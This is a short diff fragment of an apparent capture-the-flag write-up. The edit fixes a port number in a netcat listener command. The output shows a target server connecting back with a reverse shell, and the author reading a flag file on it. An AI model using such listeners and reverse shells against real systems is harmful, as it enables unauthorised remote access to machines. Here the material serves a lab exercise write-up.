@@ -71,7 +71,7 @@ except socket.error, e:
 I ran a netcat listener and upon receiving a connection it succesfully spawned a shell and the flag could be read.
 
 ```
-$ nc -vl 0.0.0.0 5555
+$ nc -vl 0.0.0.0 55555
 Listening on [0.0.0.0] (family 0, port 55555)
 Connection from [104.196.247.127] port 55555 [tcp/*] accepted (family 2, sport 33950)
 cat /home/ctf/flag.txt
